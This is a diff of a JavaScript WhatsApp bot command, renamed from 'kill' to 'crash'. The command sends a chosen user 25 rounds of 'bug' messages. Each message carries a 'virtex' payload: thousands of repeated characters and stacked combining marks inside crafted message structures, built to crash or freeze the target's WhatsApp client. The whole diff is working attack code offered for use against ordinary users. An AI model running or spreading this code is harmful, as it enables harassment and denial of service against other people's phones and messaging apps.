@@ -1,12 +1,11 @@
-import bugchat from '../bugs/bugchat.js';
-import ineffable from '../bugs/ineffable.js';
 
-async function kill(message, client) {
+export default async function crash(message, client) {
 
-    try {
+     try {
         const remoteJid = message.key?.remoteJid;
 
         if (!remoteJid) {
+
             throw new Error("Message JID is undefined.");
         }
 
@@ -16,17 +15,24 @@ async function kill(message, client) {
         const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
 
         const commandAndArgs = messageBody.slice(1).trim(); // Remove prefix and trim
+
         const parts = commandAndArgs.split(/\s+/);
+
         const args = parts.slice(1); // Extract arguments
 
         let participant;
 
         // Handle reply to message
         if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
-            participant = message.message.extendedTextMessage.contextInfo.participant; // Quoted user's JID
+
+            participant = message.message.extendedTextMessage.contextInfo.participant; 
+            // Quoted user's JID
         } else if (args.length > 0) {
+
             participant = args[0].replace('@', '') + '@s.whatsapp.net'; // Argument user JID
+
         } else {
+
             throw new Error('Specify the person to bug.');
         }
 
@@ -34,7 +40,7 @@ async function kill(message, client) {
 
         // Execute the bug command
 
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 25; i++) {
 
             await bug1(message, client, participant);
 
@@ -49,6 +55,7 @@ async function kill(message, client) {
         await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
     }
 }
+
 
 async function bug1(message, client, participant) {
     try {
@@ -78,7 +85,7 @@ async function bug1(message, client, participant) {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: `⿻Senku love you\n${"ꦾ".repeat(1000)}\n\n`
+                                text: `⿻Senku love you\n${"ဤ".repeat(1000)}\n\n`
                             },
                             nativeFlowMessage: {
                                 messageParamsJson: "{}"
@@ -128,7 +135,7 @@ async function bug2(message, client, participant) {
 
         console.log(`Sending bug2 message to: ${participant}`);
 
-        const virtex = "Senku love you" + "ြ".repeat(25000);
+        const virtex = "Senku love you" + "̵̴̵̴̶̴̴̴̴̵̵̵̶̴̴̶ًٌٌٍٍَ̡̡̡̡̡̡̡̡̡̡̢̢ٖٕٖٖٕٕٕٕٖٖٖ̭̻̭̳̩̤͚̺̭̩̱͙͙͙̭̭͙̻͙̻͙̻̻̥̲̻̭̦̦̼͙̬̺̖̖̤̬̞̩̼̮̩̼̩̼̬̱̼̼͓͙͍̹̱̭̩̹͙̼̩̼͍͉͎̱̮̺̱̱̩͍̩͕͍̺̩̫̤̩̩̩̮̩̼̮̪̞̫̝̝̥̩̦̳̮̩ٝٔٔٗٔٓٚٙٙ̓̓͊̓͒͑͋̽͑̐͑͊̑̓͑̑͑̐͑͑͑͊̎͊͑͑̈́͒́͌́͌͂͒͑͋́͛ͤͣͣͩͣͣͬͥͥͪͥͦͦͨͦͥ͐̽͂͌͐́͒͌͒͂̽͊̽͒͒͊͊͊͑̓͑̓͑͒͒͒͊͊͊̈́͊͌͆͊̕͘͢͢͡͡͠͝ͅͅͅͅͅͅͅ͏̩".repeat(25000);
 
         const msgPayload = {
             groupMentionedMessage: {
@@ -175,4 +182,4 @@ async function bug2(message, client, participant) {
 }
 
 
-export default kill;
+export default crash;
